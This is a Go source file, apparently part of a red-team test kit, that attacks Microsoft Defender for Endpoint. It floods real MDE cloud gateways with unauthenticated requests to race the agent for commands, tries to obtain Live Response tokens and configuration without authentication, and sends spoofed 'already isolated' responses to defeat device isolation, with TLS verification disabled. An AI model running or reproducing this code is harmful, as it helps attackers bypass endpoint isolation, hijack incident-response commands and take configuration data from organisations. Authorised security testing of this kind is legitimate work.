//go:build windows
// +build windows

/*
api_interceptor.go - MDE API command interception and race condition testing
SECURITY TESTING ONLY - Authorized security testing in controlled lab environments

This module provides functions to:
- Send rapid requests to MDE cloud endpoints
- Race legitimate MsSense.exe agent for commands
- Test authentication bypass vulnerabilities
- Intercept isolation commands, Live Response sessions, etc.
- Generate unauthorized CloudLR tokens
*/

package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// MDE Identifiers structure
type MDEIdentifiers struct {
	MachineID         string `json:"machineId"`
	TenantID          string `json:"tenantId"`
	SenseID           string `json:"senseId,omitempty"`
	Source            string `json:"source"`
	MDEInstalled      bool   `json:"mdeInstalled"`
	ExtractionSuccess bool   `json:"extractionSuccess"`
}

// Intercepted command structure
type InterceptedCommand struct {
	CommandType   string                 `json:"commandType"`
	CommandID     string                 `json:"commandId,omitempty"`
	RawResponse   string                 `json:"rawResponse"`
	ParsedData    map[string]interface{} `json:"parsedData,omitempty"`
	Endpoint      string                 `json:"endpoint"`
	Timestamp     time.Time              `json:"timestamp"`
	Intercepted   bool                   `json:"intercepted"`
	HTTPStatus    int                    `json:"httpStatus"`
	Authenticated bool                   `json:"authenticated"`
}

// API interception result
type APIInterceptionResult struct {
	TotalRequests      int                  `json:"totalRequests"`
	SuccessfulRequests int                  `json:"successfulRequests"`
	CommandsIntercepted int                 `json:"commandsIntercepted"`
	Commands           []InterceptedCommand `json:"commands"`
	VulnerabilityFound bool                 `json:"vulnerabilityFound"`
	AuthBypassWorks    bool                 `json:"authBypassWorks"`
	ErrorMessages      []string             `json:"errorMessages,omitempty"`
	TestDuration       float64              `json:"testDuration"`
}

// CloudLR token structure
type CloudLRToken struct {
	TokenType    string    `json:"tokenType"`
	MachineID    string    `json:"machineId"`
	Generated    time.Time `json:"generated"`
	ValidUntil   time.Time `json:"validUntil"`
	Capabilities []string  `json:"capabilities"`
	Authenticated bool     `json:"authenticated"`
	TokenData    string    `json:"tokenData,omitempty"`
}

// MDE cloud endpoints by region
var mdeEndpoints = []string{
	"winatp-gw-eus.microsoft.com",  // East US
	"winatp-gw-weu.microsoft.com",  // West Europe
	"winatp-gw-cus.microsoft.com",  // Central US
	"winatp-gw-neu.microsoft.com",  // North Europe
}

// RaceForCommands attempts to intercept commands using race condition
func RaceForCommands(identifiers *MDEIdentifiers, duration time.Duration, requestsPerSecond int) *APIInterceptionResult {
	result := &APIInterceptionResult{
		Commands:        []InterceptedCommand{},
		ErrorMessages:   []string{},
		VulnerabilityFound: false,
		AuthBypassWorks:    false,
	}

	startTime := time.Now()

	// Create HTTP client with TLS skip verification (for testing)
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // Testing only!
			},
		},
	}

	// Mutex for thread-safe result updates
	var mu sync.Mutex

	// Channel to signal completion
	done := make(chan bool)

	// Spawn goroutines for concurrent requests
	requestInterval := time.Second / time.Duration(requestsPerSecond)

	go func() {
		ticker := time.NewTicker(requestInterval)
		defer ticker.Stop()

		timeoutChan := time.After(duration)

		for {
			select {
			case <-ticker.C:
				// Try each endpoint
				for _, endpoint := range mdeEndpoints {
					go func(ep string) {
						cmd := attemptCommandInterception(client, ep, identifiers)

						mu.Lock()
						result.TotalRequests++
						if cmd != nil {
							if cmd.HTTPStatus == 200 {
								result.SuccessfulRequests++
							}
							if cmd.Intercepted {
								result.CommandsIntercepted++
								result.Commands = append(result.Commands, *cmd)
							}
							if cmd.HTTPStatus == 200 && !cmd.Authenticated {
								result.VulnerabilityFound = true
								result.AuthBypassWorks = true
							}
						}
						mu.Unlock()
					}(endpoint)
				}

			case <-timeoutChan:
				done <- true
				return
			}
		}
	}()

	// Wait for completion
	<-done

	result.TestDuration = time.Since(startTime).Seconds()
	return result
}

// attemptCommandInterception sends a single unauthenticated request to CnC endpoint
func attemptCommandInterception(client *http.Client, endpoint string, identifiers *MDEIdentifiers) *InterceptedCommand {
	cmd := &InterceptedCommand{
		Endpoint:      endpoint,
		Timestamp:     time.Now(),
		Intercepted:   false,
		Authenticated: false, // We're NOT sending auth headers!
	}

	// Build URL
	url := fmt.Sprintf("https://%s/edr/commands/cnc", endpoint)

	// Create request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil
	}

	// Add MDE-specific headers (WITHOUT authentication!)
	// This tests if the vulnerability still exists
	req.Header.Set("X-MachineId", identifiers.MachineID)
	req.Header.Set("X-TenantId", identifiers.TenantID)
	req.Header.Set("User-Agent", "Microsoft Defender for Endpoint")

	// Deliberately omit:
	// - Authorization header
	// - Msadeviceticket header
	// This tests the authentication bypass

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		// Network error (common for isolated systems)
		return nil
	}
	defer resp.Body.Close()

	cmd.HTTPStatus = resp.StatusCode

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return cmd
	}

	cmd.RawResponse = string(body)

	// Check if we got a command (non-empty response)
	if len(body) > 10 && resp.StatusCode == 200 {
		cmd.Intercepted = true

		// Try to parse as JSON
		var parsedData map[string]interface{}
		if err := json.Unmarshal(body, &parsedData); err == nil {
			cmd.ParsedData = parsedData

			// Extract command type if available
			if cmdType, ok := parsedData["commandType"].(string); ok {
				cmd.CommandType = cmdType
			}
			if cmdID, ok := parsedData["commandId"].(string); ok {
				cmd.CommandID = cmdID
			}
		}
	}

	return cmd
}

// AttemptCloudLRTokenGeneration tries to generate CloudLR token without auth
func AttemptCloudLRTokenGeneration(identifiers *MDEIdentifiers) (*CloudLRToken, error) {
	// Create HTTP client
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	// Try SenseIR actions endpoint
	url := fmt.Sprintf("https://%s/senseir/v1/actions/", mdeEndpoints[0])

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Add headers WITHOUT proper authentication
	req.Header.Set("X-MachineId", identifiers.MachineID)
	req.Header.Set("User-Agent", "Microsoft Defender for Endpoint")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// Check if we got a token
	if resp.StatusCode == 200 && len(body) > 0 {
		token := &CloudLRToken{
			TokenType:     "CloudLR",
			MachineID:     identifiers.MachineID,
			Generated:     time.Now(),
			ValidUntil:    time.Now().Add(24 * time.Hour),
			Capabilities:  []string{"command_execution", "file_download", "file_upload"},
			Authenticated: false, // We didn't authenticate!
			TokenData:     string(body),
		}
		return token, nil
	}

	return nil, fmt.Errorf("token generation failed: HTTP %d", resp.StatusCode)
}

// AttemptConfigurationExfiltration tries to retrieve MDE config without auth
func AttemptConfigurationExfiltration(identifiers *MDEIdentifiers) (map[string]interface{}, error) {
	client := &http.Client{
		Timeout: 30 * time.Second, // Longer timeout for large config file
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	// Request general config
	url := fmt.Sprintf("https://%s/edr/config", mdeEndpoints[0])

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Unauthenticated request
	req.Header.Set("User-Agent", "Microsoft Defender for Endpoint")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("config retrieval failed: HTTP %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// Parse config
	var config map[string]interface{}
	if err := json.Unmarshal(body, &config); err != nil {
		// Return raw if not JSON
		return map[string]interface{}{
			"raw": string(body),
			"size": len(body),
		}, nil
	}

	return config, nil
}

// SendSpoofedIsolationResponse sends fake "already isolated" response
func SendSpoofedIsolationResponse(endpoint string, commandID string, identifiers *MDEIdentifiers) error {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	// Build status endpoint URL
	url := fmt.Sprintf("https://%s/commands/status", endpoint)

	// Create spoofed response payload
	payload := map[string]interface{}{
		"commandId": commandID,
		"status":    "AlreadyIsolated",
		"message":   "Device is already isolated",
		"timestamp": time.Now().Format(time.RFC3339),
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, strings.NewReader(string(payloadBytes)))
	if err != nil {
		return err
	}

	// Headers without proper auth
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-MachineId", identifiers.MachineID)
	req.Header.Set("X-TenantId", identifiers.TenantID)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("spoofed response rejected: HTTP %d", resp.StatusCode)
	}

	return nil
}

// SaveAPIInterceptionReport saves the API interception report to disk
func SaveAPIInterceptionReport(result *APIInterceptionResult) error {
	reportPath := filepath.Join("c:\\F0", "api_interception_report.json")

	data, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal report: %v", err)
	}

	if err := os.WriteFile(reportPath, data, 0644); err != nil {
		return fmt.Errorf("failed to write report: %v", err)
	}

	return nil
}

// SaveCloudLRToken saves token to disk for analysis
func SaveCloudLRToken(token *CloudLRToken) error {
	tokenPath := filepath.Join("c:\\F0", "cloudlr_token.json")

	data, err := json.MarshalIndent(token, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal token: %v", err)
	}

	if err := os.WriteFile(tokenPath, data, 0644); err != nil {
		return fmt.Errorf("failed to write token: %v", err)
	}

	return nil
}

// SaveExfiltratedConfig saves exfiltrated config to disk
func SaveExfiltratedConfig(config map[string]interface{}) error {
	configPath := filepath.Join("c:\\F0", "exfiltrated_config.json")

	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal config: %v", err)
	}

	if err := os.WriteFile(configPath, data, 0644); err != nil {
		return fmt.Errorf("failed to write config: %v", err)
	}

	return nil
}
